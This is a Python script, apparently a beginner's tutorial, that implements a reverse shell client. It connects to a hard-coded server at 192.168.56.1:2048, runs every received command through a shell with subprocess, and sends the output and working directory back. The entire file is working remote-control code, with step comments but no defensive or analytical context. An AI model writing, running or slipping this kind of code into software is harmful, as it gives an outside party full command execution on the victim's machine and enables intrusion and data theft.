#1. create your socket
#2. bind or connect it to the host and ip address
#3. communicate with your server

import socket
import os
import subprocess


#function to create your socket
def create_socket():
    #create a variable to store the socket
    global client_socket

    #assign the socket to the variable
    client_socket = socket.socket()
    print('Socket successfully created')


def connect_socket():
    #create variables for the ip address and port number of the server
    global host
    global port
    global client_socket

    #assign values to your variables
    host = '192.168.56.1'
    port = 2048

    #connect your socket to your server
    client_socket.connect((host, port))
    print('\nConnection successfully created\n')


#communicate with server
def communicate_w_server():
    #import your global variables
    global client_socket

    while True:
        #receive the command from the server
        server_command = client_socket.recv(1024)

        #convert it to string readable form
        server_command_string = server_command.decode('utf-8')

        #perform data checks
        if server_command_string[:2] == 'cd':
            os.chdir(server_command_string[3:])

        #process the command sent from the server
        if len(server_command_string) > 0:
            command_process = subprocess.Popen(server_command_string[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

            #store the output in a variable
            command_output = command_process.stdout.read() + command_process.stderr.read()

            #convert to string
            command_output_string = str(command_output, 'utf-8')

            #get the current working directory
            current_WD = os.getcwd()

            #send the output back to the server
            client_socket.send(str.encode(command_output_string + current_WD))

def main():
    create_socket()
    connect_socket()
    communicate_w_server()
    input()
main()